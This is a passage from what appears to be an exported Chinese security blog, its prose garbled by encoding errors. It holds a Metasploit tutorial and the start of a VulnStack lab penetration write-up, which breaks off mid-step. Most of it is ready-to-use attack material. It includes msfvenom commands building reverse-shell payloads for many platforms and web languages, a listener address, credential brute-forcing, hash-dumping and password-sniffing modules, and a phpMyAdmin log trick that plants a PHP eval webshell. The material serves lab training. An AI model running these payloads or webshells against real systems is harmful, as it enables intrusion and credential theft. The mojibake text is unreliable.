‡æœºå™¨çš„cmdä¸­å»æ‰§è¡Œè§¦å‘,ä¼šå¼¹å›ä¸€ä¸ªpowershellçš„shell\n\n```bash\nmsfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1\n```\n\n#### linux å¹³å°\n\nç›´æ¥èµ‹äºˆæ‰§è¡Œæƒé™,æ‰§è¡Œå³å¯è§¦å‘\n\n```bash\nmsfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f elf -o x86_shell.elf\n```\n\n#### mac å¹³å°\n\n```bash\nmsfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f macho -o x86_shell.macho\n```\n\n#### androidå¹³å°\n\næ³¨æ„è¿™é‡Œç”Ÿæˆçš„apkæ˜¯ä¸èƒ½ç›´æ¥è¢«è£…åˆ°æ‰‹æœºä¸Šçš„,è¿˜éœ€è¦ä½ è‡ªå·±ç»™apkç­¾ä¸ªåæ‰èƒ½è£…,è£…å®Œä»¥åç‚¹å‡»æ‰“å¼€å³å¯è§¦å‘\n\n```bash\nmsfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f apk -o x86_shell.apk\n```\n\n### å„ç±»webçš„Payload\n\nåŸºäºè„šæœ¬,å¯¹äºæ­¤ç±»çš„webè„šæœ¬è§¦å‘æ‰§è¡Œæ–¹æ³•éå¸¸ç®€å•,ç›´æ¥åœ¨urlä¸­è®¿é—®è¯¥è„šæœ¬å³å¯\n\n#### php è„šæœ¬\n\n```bash\nmsfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.php\n```\n\n#### asp è„šæœ¬\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f asp -o shell.asp\n```\n\n#### aspx è„šæœ¬\n\n```bash\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f aspx -o x86_shell.aspx\n```\n\n#### jsp è„šæœ¬\n\n```bash\nmsfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.jsp\n```\n\n#### waråŒ…\n\næ‰¾ä¸ªèƒ½éƒ¨ç½²waråŒ…çš„åœ°æ–¹,å¦‚å„ç±»javaæ§åˆ¶å°,éƒ¨ç½²ä¸€ä¸‹å³å¯æ‰§è¡Œ\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.war\n```\n\n### å„ç±»è„šæœ¬çš„payload\n\n#### nodejs\n\n```bash\nmsfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.js\n```\n\n#### python\n\n```bash\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.py\n```\n\n#### perl\n\n```bash\nmsfvenom -p cmd/unix/reverse_perl LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.pl\n```\n\n#### ruby\n\n```bash\nmsfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.rb\n```\n\n#### lua\n\n```bash\nmsfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.lua\n```\n\n#### bash\n\n```bash\nmsfvenom -p cmd/unix/reverse_bash LHOST=192.168.3.12 LPORT=12345 -f raw -o shell.sh\n```\n\n**å‚è€ƒï¼š**\n\n- [Metasploitâ€”â€”msfvenomå…æ€æœ¨é©¬](https://blog.csdn.net/weixin_44677409/article/details/96346481)\n- [msfvenomè¿›é˜¶](https://klionsec.github.io/2017/03/08/msfvenom-advanced/)\n- [è¿œæ§å…æ€ä¸“é¢˜æ–‡ç« (2)-msfvenoméšè—çš„å‚æ•°](https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w)\n\n## Metasploitä¿¡æ¯æ”¶é›†ç¯‡\n\nåŸºäºTCPåè®®æ”¶é›†ä¸»æœºä¿¡æ¯\n\n### ä¸»æœºä¿¡æ¯æ”¶é›†\n\nä½¿ç”¨`auxiliary/scanner/discovery/`ä¸‹æ¨¡å—è¿›è¡Œæ‰«æ\n\n```bash\nuse auxiliary/scanner/discovery/arp_sweep #å‘ç°å­˜æ´»çš„ä¸»æœº\nuse auxiliary/scanner/discovery/empty_udp\nuse auxiliary/scanner/discovery/ipv6_multicast_ping\nuse auxiliary/scanner/discovery/ipv6_neighbor\nuse auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement\nuse auxiliary/scanner/discovery/udp_probe\nuse auxiliary/scanner/discovery/udp_sweep #é™¤äº†å¯ä»¥æ¢æµ‹åˆ°å­˜æ´»ä¸»æœºä¹‹å¤–ï¼Œè¿˜å¯ä»¥è·å¾—ä¸»æœºåç§°ä¿¡æ¯\n```\n\n**å®ä¾‹ï¼šä½¿ç”¨arp_sweepæ¨¡å—æ¥å‘ç°å­˜æ´»çš„ä¸»æœº**\n\n```bash\nsearch arp_sweepÂ  Â  Â  Â #æŸ¥è¯¢æ­¤æ¨¡å—ä¸‹çš„æ”»å‡»æ¨¡å—\nuseÂ  Â æŸ¥è¯¢å‡ºæ¥çš„æ”»å‡»æ¨¡å—Â  #åŠ è½½æ”»å‡»æ¨¡å—\nshow optionsÂ  Â  Â  Â  Â  Â #æŸ¥çœ‹ä¸€ä¸‹è¯¥æ¨¡å—éœ€è¦é…ç½®çš„é€‰é¡¹å‚æ•°\nset RHOSTS ç›®æ ‡æœºipÂ  Â  Â #ä½¿ç”¨setå‘½ä»¤å°†RHOSTSè®¾ç½®ä¸ºç›®æ ‡ç”µè„‘çš„IP\nexploitÂ  Â  Â  Â  Â  Â  Â  Â  #è¿›è¡Œæ”»å‡»\n```\n\n### ä¸»æœºç«¯å£æ‰«æ\n\nä½¿ç”¨`auxiliary/scanner/portscan/`ä¸‹çš„æ¨¡å—æ¢æµ‹ä¸»æœºç«¯å£\n\n```bash\nauxiliary/scanner/portscan/ack       #ACKé˜²ç«å¢™æ‰«æ\nauxiliary/scanner/portscan/ftpbounce #FTPè·³ç«¯å£æ‰«æ\nauxiliary/scanner/portscan/syn       #SYNç«¯å£æ‰«æ(åŠè¿æ¥æ‰«æ)\nauxiliary/scanner/portscan/tcp       #TCPç«¯å£æ‰«æ\nauxiliary/scanner/portscan/xmas      #TCPâ€XMasâ€ç«¯å£æ‰«æ\n```\n\n### SMBæ‰«æ\n\n> SMB(å…¨ç§°æ˜¯Server Message Block)æ˜¯ä¸€ä¸ªåè®®åï¼Œå®ƒèƒ½è¢«ç”¨äºWebè¿æ¥å’Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ä¿¡æ¯æ²Ÿé€šã€‚åŸºäºSSHåè®®æ”¶é›†ä¿¡æ¯ï¼Œç«¯å£ï¼š`139`ã€`445`\n\nä½¿ç”¨`auxiliary/scanner/smb/`ä¸‹çš„æ¨¡å—è¿›è¡ŒSMBç›¸å…³æ“ä½œ\n\n```bash\nauxiliary/scanner/smb/pipe_auditor \t\t    #æ‰«æå‘½åç®¡é“\nauxiliary/scanner/smb/pipe_dcerpc_auditor    #è¿”å›DCERPCä¿¡æ¯\nauxiliary/scanner/smb/psexec_loggedin_users  \nauxiliary/scanner/smb/smb2                   #æ‰«æSMB2åè®®\nauxiliary/scanner/smb/smb_enum_gpp           \nauxiliary/scanner/smb/smb_enumshares         #æ‰«æsmbå…±äº«æ–‡ä»¶\nauxiliary/scanner/smb/smb_enumusers          #smbæšä¸¾ç³»ç»Ÿç”¨æˆ·\nauxiliary/scanner/smb/smb_enumusers_domain   \nauxiliary/scanner/smb/smb_login              #SMBç™»å½•\nauxiliary/scanner/smb/smb_lookupsid          #æ‰«æç»„çš„ç”¨æˆ·\nauxiliary/scanner/smb/smb_uninit_cred        \nauxiliary/scanner/smb/smb_version            #æ‰«æç³»ç»Ÿç‰ˆæœ¬\n```\n\n**å®ä¾‹ï¼šä½¿ç”¨ smb_version åŸºäº SMB åè®®æ‰«æç‰ˆæœ¬å· **\n\n```bash\nmsf5 > use auxiliary/scanner/smb/smb_version \n#è®¾ç½®æ‰«æç›®æ ‡ï¼Œæ³¨æ„å¤šä¸ªç›®æ ‡ä½¿ç”¨é€—å·+ç©ºæ ¼éš”å¼€ \nmsf5 auxiliary(scanner/smb/smb_version) > show options \nmsf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.56, 192.168.1.180  \n#æ³¨ï¼š 192.168.1.56 åé¢çš„é€—å·å’Œ 192.168.1.180 ä¹‹é—´æ˜¯æœ‰ç©ºæ ¼çš„ \nmsf5 auxiliary(scanner/smb/smb_version) > run \n```\n\næ‰«æå‡ºæ¥æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å·\n\n![](https://img.jwt1399.top//img/20200813104251.png)\n\n### SSHæ¢æµ‹æ‰«æ\n\nä½¿ç”¨`auxiliary/scanner/ssh/`ä¸‹çš„æ¨¡å—æ¢æµ‹sshä¿¡æ¯\n\n```bash\nauxiliary/scanner/ssh/cerberus_sftp_enumusers\nauxiliary/scanner/ssh/detect_kippo\nauxiliary/scanner/ssh/ssh_enumusers     #æšä¸¾ç”¨æˆ·\nauxiliary/scanner/ssh/ssh_identify_pubkeys\nauxiliary/scanner/ssh/ssh_login         #å¯†ç çˆ†ç ´\nauxiliary/scanner/ssh/ssh_login_pubkey\nauxiliary/scanner/ssh/ssh_version       #æŸ¥çœ‹ç‰ˆæœ¬\n```\n\n### FTPæ¢æµ‹æ‰«æ\n\nä½¿ç”¨`auxiliary/scanner/ftp/`ä¸‹çš„æ¨¡å—æ¢æµ‹ftpä¿¡æ¯\n\n```bash\nauxiliary/scanner/ftp/anonymous         #åŒ¿åç™»å½•æ‰«æ\nauxiliary/scanner/ftp/bison_ftp_traversal\nauxiliary/scanner/ftp/ftp_login         #å¯†ç çˆ†ç ´\nauxiliary/scanner/ftp/ftp_version       #æŸ¥çœ‹ç‰ˆæœ¬\nauxiliary/scanner/ftp/konica_ftp_traversal\nauxiliary/scanner/ftp/pcman_ftp_traversal\nauxiliary/scanner/ftp/titanftp_xcrc_traversal\n```\n\n### MYSQLæ¢æµ‹æ‰«æ\n\nä½¿ç”¨`auxiliary/scanner/mysql/`ä¸‹çš„æ¨¡å—æ¢æµ‹mysqlä¿¡æ¯\n\n```bash\nauxiliary/scanner/mysql/mysql_authbypass_hashdump\nauxiliary/scanner/mysql/mysql_file_enum\nauxiliary/scanner/mysql/mysql_hashdump   #dumpå¯†ç hash\nauxiliary/scanner/mysql/mysql_login      #å¯†ç çˆ†ç ´\nauxiliary/scanner/mysql/mysql_schemadump\nauxiliary/scanner/mysql/mysql_version    #æŸ¥çœ‹ç‰ˆæœ¬\n```\n\n### SQLSERVERæ¢æµ‹æ‰«æ\n\nä½¿ç”¨`auxiliary/scanner/mssql/`ä¸‹çš„æ¨¡å—æ¢æµ‹SQL serverçš„ä¿¡æ¯\n\n```bash\nauxiliary/scanner/mssql/mssql_hashdump  #dumpå¯†ç hash\nauxiliary/scanner/mssql/mssql_login     #å¯†ç çˆ†ç ´\nauxiliary/scanner/mssql/mssql_ping      #å—…æ¢\nauxiliary/scanner/mssql/mssql_schemadump\n```\n\n### **SNMPæ‰«æ**\n\n> ç®€å•ç½‘ç»œç®¡ç†åè®®ï¼ˆ[SNMP](https://baike.baidu.com/item/SNMP/133378)ï¼‰ æ˜¯ä¸“é—¨è®¾è®¡ç”¨äºåœ¨ IP ç½‘ç»œç®¡ç†[ç½‘ç»œèŠ‚ç‚¹](https://baike.baidu.com/item/ç½‘ç»œèŠ‚ç‚¹/9338583)ï¼ˆæœåŠ¡å™¨ã€å·¥ä½œç«™ã€è·¯ç”±å™¨ã€äº¤æ¢æœºåŠHUBSç­‰ï¼‰çš„ä¸€ç§æ ‡å‡†åè®®ï¼ŒSNMP ä½¿ç½‘ç»œç®¡ç†å‘˜èƒ½å¤Ÿç®¡ç†ç½‘ç»œæ•ˆèƒ½ï¼Œå‘ç°å¹¶è§£å†³ç½‘ç»œé—®é¢˜ä»¥åŠè§„åˆ’ç½‘ç»œå¢é•¿ã€‚é€šè¿‡ SNMP æ¥æ”¶éšæœºæ¶ˆæ¯ï¼ˆåŠäº‹ä»¶æŠ¥å‘Šï¼‰ç½‘ç»œç®¡ç†ç³»ç»Ÿè·çŸ¥ç½‘ç»œå‡ºç°é—®é¢˜ã€‚ç«¯å£ï¼š`161`\n\nä½¿ç”¨`auxiliary/scanner/snmp/`ä¸‹çš„æ¨¡å—æ¢æµ‹ SNMP çš„ä¿¡æ¯\n\n```bash\nuse auxiliary/scanner/snmp/snmp_login #ç¡®å®šSNMPè®¾å¤‡å›¢ä½“å­—ç¬¦ä¸²çš„æ¨¡å—ã€‚\nuse auxiliary/scanner/snmp/snmp_enum  #ä¸»æœºçš„æšä¸¾\nuse auxiliary/scanner/snmp/snmp_enumusers ï¼ˆwindowsï¼‰ #æ”¶é›†åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šçš„ç”¨æˆ·åçš„åˆ—è¡¨ã€‚\nuse auxiliary/scanner/snmp/snmp_enumshares ï¼ˆwindowsï¼‰#æŸ¥è¯¢èŒƒå›´çš„ä¸»æœºï¼Œä»¥ç¡®å®šä»»ä½•å¯ç”¨çš„å…±äº«ã€‚\n```\n\n**å®ä¾‹**:\n\n1ã€å…ˆåˆ° Metasploitable2-Linux ä¸»æœºä¸Šä¿®æ”¹ä¸€ä¸‹ SNMP æœåŠ¡ï¼Œå› ä¸ºé»˜è®¤æœåŠ¡æ˜¯ä¸å¯¹å¤–å¼€æ”¾çš„ã€‚ \n\n```bash\nmsfadmin@metasploitable:~# sudo vim  /etc/default/snmpd \n#ä¿®æ”¹ç¬¬11è¡Œï¼Œä¾¦å¬åœ°å€ä¿®æ”¹ä¸º0.0.0.0 \nSNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1' \nä¿®æ”¹ä¸ºï¼š \nSNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'  \n#é‡å¯ SNMP æœåŠ¡ \nmsfadmin@metasploitable:~$ sudo /etc/init.d/snmpd restart \n#ç¡®è®¤æœåŠ¡ç›‘å¬æ­£å¸¸ \nmsfadmin@metasploitable:~$ netstat -antup | grep 161 \n(No info could be read for \"-p\": geteuid()=1000 but you should be root.) \nudp        0      0 0.0.0.0:161             0.0.0.0:*    \n```\n\n2ã€ä½¿ç”¨ snmp_enum æ¨¡å—é€šè¿‡ snmp åè®®æ‰«æç›®æ ‡æœåŠ¡å™¨ä¿¡æ¯\n\n```bash\nmsf5 > use auxiliary/scanner/snmp/snmp_enum \nmsf5 auxiliary(scanner/snmp/snmp_enum) > show options \nmsf5 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.180 #é¶æœºip\nmsf5 auxiliary(scanner/snmp/snmp_enum) > run \n```\n\n3ã€å¯ä»¥çœ‹åˆ°é€šè¿‡ snmp åè®®æ¢æµ‹åˆ°çš„ä¿¡æ¯éå¸¸å¤šã€‚å¦‚æœåŠ¡å™¨ç¡¬ä»¶ä¿¡æ¯å’ŒæœåŠ¡å™¨å½“å‰è¿è¡Œçš„è¿›ç¨‹ï¼Œè¿™ä¸¤æ–¹é¢æ˜¯å…¶ä»–æ‰«ææ–¹å¼è·å–ä¸åˆ°çš„ã€‚\n\n![](https://img.jwt1399.top//img/20200813101917.png)\n\n### å¯†ç å—…æ¢æ¨¡å—\n\nè¿™ä¸ª psnuffle æ¨¡å—å¯ä»¥åƒä»¥å‰çš„ dsniff å‘½ä»¤ä¸€æ ·ï¼Œå»å—…æ¢å¯†ç ï¼Œ ç›®å‰æ”¯æŒPOP3ï¼ŒIMAPï¼ŒFTPå’ŒHTTP GET åè®®ã€‚\n![](https://img.jwt1399.top//img/20200813094617.png)\n\n**1ã€Kaliå¼€å¯å—…æ¢**\n\n```bash\nmsf5 > search sniffer \nmsf5 > use auxiliary/sniffer/psnuffle\nmsf5 auxiliary(sniffer/psnuffle) >  info #æŸ¥çœ‹ psnuffle æ¨¡å—ä½œç”¨\nmsf5 auxiliary(sniffer/psnuffle) > show options \nmsf5 auxiliary(psnuffle) > run Â #ç›´æ¥runæ˜¯å®æ—¶åœ¨çº¿çš„å—…æ¢\n\nmsf5 auxiliary(psnuffle) > set pcapfile /root/ftp.pcap Â #è®¾ç½®pcapfileå¯ä»¥æå–pcapæ–‡ä»¶ä¸­çš„è´¦å·å¯†ç \n```\n\n**2ã€æ¨¡æ‹Ÿé¶æœºç™»å½•FTP**\n\n```bash\n#kaliæ–°å»ºä¸€ä¸ªç»ˆç«¯çª—å£ç™»å½•ftpï¼ŒMetasploitable2-Linux é¶æœºä¸­å·²ç»å¼€å¯äº† FTP æœåŠ¡å¯ä»¥ç›´æ¥ç™»å½•ã€‚\nroot@kali:~# apt install lftp -y   #å®‰è£… lftp å‘½ä»¤ \nroot@kali:~# lftp -u msfadmin 192.168.1.180 #ç™»å½• FTP\nå¯†ç :msfadmin \n#è¿æ¥æˆåŠŸåï¼Œè¿›è¡Œä¸‹æ•°æ®äº¤äº’ï¼ŒæŸ¥çœ‹ ftp ç›®å½•ä¸‹çš„æ–‡ä»¶ \nlftp msfadmin@192.168.1.180:~> ls   \ndrwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable \n```\n\n**3ã€æŸ¥çœ‹å—…æ¢åˆ°çš„æ•°æ®**\n\nå›åˆ° MSF ç»ˆç«¯å¯ä»¥çœ‹åˆ°ç”¨æˆ·åå¯†ç ä¿¡æ¯å·²ç»è¢«è·å–ã€‚\n\n![](https://img.jwt1399.top//img/20200813100540.png)\n\n**4ã€å…³é—­ä»»åŠ¡**\n\n```bash\n#å—…æ¢å®Œæˆåè®°å¾—æŠŠåå°ä»»åŠ¡å…³é—­ \nmsf5 auxiliary(psnuffle) > jobs #æŸ¥çœ‹åå°è¿è¡Œçš„ä»»åŠ¡\nmsf5 auxiliary(psnuffle) > kill 0 Â  #kill job çš„ IDï¼Œå…³é—­ job \n```\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Metasploit"],"categories":["Tools"]},{"title":"å†…ç½‘æ¸—é€é¶æœºï¼šVulnStack1","url":"/posts/25535.html","content":"\nVulnStackæ˜¯çº¢æ—¥å®‰å…¨å›¢é˜Ÿå‡ºçš„ä¸€ä¸ªå†…ç½‘æ¸—é€çš„é¶æœºç¯å¢ƒï¼Œæƒ³ç€é€šè¿‡é¶åœºç¯å¢ƒåŠ æ·±å¯¹ Cobalt Strike å’Œ Metasploit çš„å­¦ä¹ \n\n## é¶æœºç®€ä»‹\n\n> çº¢é˜Ÿå®æˆ˜ç³»åˆ—ï¼Œä¸»è¦ä»¥çœŸå®ä¼ä¸šç¯å¢ƒä¸ºå®ä¾‹æ­å»ºä¸€ç³»åˆ—é¶åœºï¼Œé€šè¿‡ç»ƒä¹ ã€è§†é¢‘æ•™ç¨‹ã€åšå®¢ä¸‰ä½ä¸€ä½“å­¦ä¹ ã€‚å¦å¤–æœ¬æ¬¡å®æˆ˜å®Œå…¨æ¨¡æ‹Ÿ ATT&CK æ”»å‡»é“¾è·¯è¿›è¡Œæ­å»ºï¼Œå¼€æˆå®Œæ•´é—­ç¯ã€‚åç»­ä¹Ÿä¼šæ­å»ºçœŸå® APT å®æˆ˜ç¯å¢ƒï¼Œä»å®æˆ˜ä¸­æˆé•¿ã€‚è™šæ‹Ÿæœºæ‰€æœ‰ç»Ÿä¸€å¯†ç ï¼šhongrisec@2019\n\né¶æœºä¸‹è½½åœ°å€ï¼š[**ATT&CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº**](http://vulnstack.qiyuanxuetang.net/vuln/detail/2/)\n\n## ç¯å¢ƒæ­å»º\n\n| ç½‘ç»œæ‹“æ‰‘ç»“æ„        | ![ç½‘ç»œæ‹“æ‰‘å›¾](https://img.jwt1399.top//img/20200803112138.png) |\n| ------------------- | ------------------------------------------------------------ |\n| **VMware ç½‘ç»œé…ç½®** | ![VMware ç½‘ç»œé…ç½®](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/20200803123245.png) |\n| **ç½‘ç»œç¤ºæ„å›¾**      | ![ç½‘ç»œç¤ºæ„å›¾](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/20200803123242.png) |\n| **å®é™…é…ç½®å›¾**      | ![å®é™…é…ç½®å›¾](https://img.jwt1399.top//img/20200803123239.jpg) |\n\næ¨¡æ‹Ÿå¤–ç½‘ï¼šVmnet1ï¼ˆ192.168.52.0/24ï¼‰\n\næ¨¡æ‹Ÿå†…ç½‘ï¼šVMnet2ï¼ˆ192.168.57.0/24ï¼‰\n\n- æ”»å‡»æœºï¼šKali2020\n  - IPï¼š192.168.52.128\n\n- WebæœåŠ¡å™¨ï¼šWindows7  \n  - å¤–ç½‘IPï¼š192.168.52.143   \n  - å†…ç½‘IPï¼š192.168.72.128 \n  - ä¸»æœºåï¼šstu1\n- åŸŸæˆå‘˜ä¸»æœºï¼šWindows Server 2003\n  - IPï¼š192.168.72.141       \n  - ä¸»æœºåï¼šroot-tvi862ubeh\n- åŸŸæ§æœåŠ¡å™¨ï¼šWindows Server 2008\n  - IPï¼š192.168.72.138\n  - ä¸»æœºåï¼šowa             \n\n\n\n**å¯åŠ¨Webç¯å¢ƒï¼šæ‰“å¼€Win7åï¼Œæ‰“å¼€PhpStudy**\n\n## å¤–ç½‘æ¸—é€\n\n### ä¿¡æ¯æ”¶é›†\n\n#### 1.æ¢æµ‹ä¸»æœº\n\n```bash\nnetdiscover -i eth0 -r 192.168.52.0/24\n```\n\n![](https://img.jwt1399.top//img/20200804102558.png)\n\n#### 2.æŸ¥çœ‹ç›®æ ‡ä¸»æœºå¼€æ”¾ç«¯å£\n\n```bash\nnmap -sV -p- 192.168.52.143\n\n-sV ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºå’Œç«¯å£ä¸Šè¿è¡Œçš„è½¯ä»¶çš„ç‰ˆæœ¬\n-p- æ‰«æ0-65535å…¨éƒ¨ç«¯å£\n```\n\n![](https://img.jwt1399.top//img/20200804102548.png)\n\nå¼€æ”¾äº†80å’Œ3306ç«¯å£ï¼Œè¯´æ˜å­˜åœ¨WebæœåŠ¡\n\n#### 3.æŸ¥çœ‹ç½‘é¡µæ”¶é›†ç›¸å…³ä¿¡æ¯\n\n**1.è®¿é—®webé¡µé¢ï¼Œè·å–åˆ°phpMyadminç™»å½•å¯†ç **\n\nè®¿é—®WebæœåŠ¡æ˜¯ä¸€ä¸ª `phpStudy` æ¢é’ˆé¡µé¢ï¼Œåœ¨è¿™é‡Œå¯ä»¥è·å–åˆ°ç½‘ç«™çš„ç»å¯¹è·¯å¾„ `C:/phpStudy/www/`\n\næœ€ä¸‹é¢ `MYSQL` æ•°æ®åº“è¿æ¥æ£€æµ‹ï¼šè¾“å…¥å¼±å¯†ç  `root/root` æˆåŠŸè¿æ¥\n\næˆ–è€…ä½¿ç”¨phpMyadminçˆ†ç ´å·¥å…·ä¹Ÿèƒ½å¾—åˆ°ç”¨æˆ·åå¯†ç \n\n![](https://img.jwt1399.top//img/20200804113505.png)\n\n**2.æ‰«æç›®å½•ï¼Œè·å–åˆ°ç½‘ç«™åå°è·¯å¾„å’Œç™»å½•ç”¨æˆ·å’Œå¯†ç **\n\n![](https://img.jwt1399.top//img/20200804112911.png)\n\næ‰«æåˆ°æ•°æ®åº“åå° `PhpMyadmin` å’Œå¤‡ä»½æ–‡ä»¶ `beifen.rar`ï¼Œä¸‹è½½è§£å‹å¾—åˆ° `yxcms` æ–‡ä»¶å¤¹ï¼Œæ˜¯ä¸€ä¸ªç½‘ç«™çš„æºç ï¼Œç›´æ¥è®¿é—®`http://192.168.52.143/yxcms`ï¼Œå‘ç°äº†ç½‘ç«™æœ‰åå°è·¯å¾„å’Œç®¡ç†å‘˜è´¦æˆ·æ³„éœ²\n\n![](https://img.jwt1399.top//img/20200804114529.png)\n\n### GetShell\n\n#### 1.phpMyadminæ—¥å¿—Getshell\n\nå‰é¢ä¿¡æ¯æ”¶é›†ç¬¬ä¸€æ­¥è·å¾—çš„phpMyadminçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç™»å½•è¿›å»æƒ³åŠæ³•è·å¾—shell\n\n**phpmyadminåå°getshellä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š**\n\n- 1ã€select into outfileç›´æ¥å†™å…¥\n- 2ã€å¼€å¯å…¨å±€æ—¥å¿—getshell\n- 3ã€ä½¿ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—getsehll\n- 4ã€ä½¿ç”¨é”™è¯¯æ—¥å¿—getshell\n- 5ã€åˆ©ç”¨phpmyadmin4.8.xæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´getshell\n\nçœ‹çœ‹ç¬¬ä¸€ç§æ˜¯å¦å¯ä»¥ï¼Œå…ˆæŸ¥çœ‹æ˜¯å¦æœ‰å†™æƒé™ï¼š\n\n```sql\nshow global variables like '%secure_file%';\n```\n\n![](https://img.jwt1399.top//img/20200804155311.png)\n\n`secure_file_priv` å€¼ä¸º `NULL`ï¼Œä¸èƒ½ä½¿ç”¨ `into outfile` æ–¹å¼å†™å…¥ shell\n\nå†æ¥çœ‹ä¸€ä¸‹ç¬¬äºŒç§ï¼Œåˆ©ç”¨å…¨å±€å˜é‡`general_log`æ¥Getshell\n\n**1.æŸ¥çœ‹å…¨å±€æ—¥å¿—çŠ¶æ€**\n\n```sql\nshow variables  like  '%general%'; \n```\n\n![](https://img.jwt1399.top//img/20200804153700.png)\n\n**2.å¼€å¯æ—¥å¿—,å°†æ‰€æœ‰æŸ¥è¯¢è¯­å¥è®°å½•åˆ°æ–°æŒ‡å®šçš„å¯è®¿é—®çš„æ–‡ä»¶ä¸­**\n\n```sql\nset global general_log=on;\n```\n\n**3.è®¾ç½®å…¨å±€æ—¥å¿—çš„è·¯å¾„ä¸ºç½‘ç«™ç›®å½•**\n\n```sql\nset global general_log_file = 'C:/phpStudy/WWW/jwt.php'\n```\n\n![ä¿®æ”¹åå…¨å±€æ—¥å¿—çŠ¶æ€](https://img.jwt1399.top//img/20200804155305.png)\n\n**4.å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥è¯¥æ—¥å¿—æ–‡ä»¶**\n\n```sql\nSELECT '<?php eval($_POST[\"cmd\"]);?>' \n```\n\n![](https://img.jwt1399.top//img/20200804154525.png)\n\næˆåŠŸè¿æ¥èšå‰‘\n\n![](https://img.jwt1399.top//img/20200804155258.png)\n\n\n\n#### 2.åå°ä¿®æ”¹å‰å°æ¨¡æ¿Getshell\n\næ ¹æ®ä¿¡æ¯æ”¶é›†ç¬¬ä¸‰æ­¥ä¸­è·å¾—çš„åå°è·¯å¾„`/index.php?r=admin`å’Œç”¨æˆ·å:admin;å¯†ç :123456\n\nç™»å½•è¿›åå°ï¼Œç„¶åå‘ç°å‰å°æ¨¡æ¿æœ‰phpæ–‡ä»¶ç¼–è¾‘ï¼Œå¯ä»¥ç›´æ¥å†™ä¸€å¥è¯æœ¨é©¬è¿›å»è·å–shell\n\n![](https://img.jwt1399.top//img/20200804151401.png)\n\nåœ¨åˆšæ‰è§£å‹çš„æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°info.phpçš„è·¯å¾„ï¼ˆ`/yxcms/protected/apps/default/view/default/info.php`ï¼‰æˆ–è€…åˆ©ç”¨ç›®å½•éå†æ‰¾åˆ°è·¯å¾„ï¼Œç›´æ¥èšå‰‘è¿æ¥\n\n![](https://img.jwt1399.top//img/20200804151358.png)\n\n **å‚è€ƒï¼š**\n\n- [phpmyadmin åå° getshell åŠæ¼æ´åˆ©ç”¨](https://soapffz.com/sec/496.html)\n\n- [ç½‘ç«™åå°getshellçš„æ–¹æ³•æ€»ç»“](http://www.mamicode.com/info-detail-2599856.html)\n\n## å†…ç½‘æ¸—é€\n\n### åå¼¹shellç»™Cobalt Strike\n\n**1.CSåˆ›å»ºListener**\n\né€šè¿‡ `Cobalt Stike` â†’ `Listeners` â†’ `Add` åˆ›å»ºä¸€ä¸ªç›‘å¬å™¨\n\n![](https://img.jwt1399.top//img/20200804163614.png)\n\n**2.ç”Ÿæˆåé—¨æ–‡ä»¶**\n\n`æ”»å‡»`â†’`ç”Ÿæˆåé—¨` â†’ `Windows 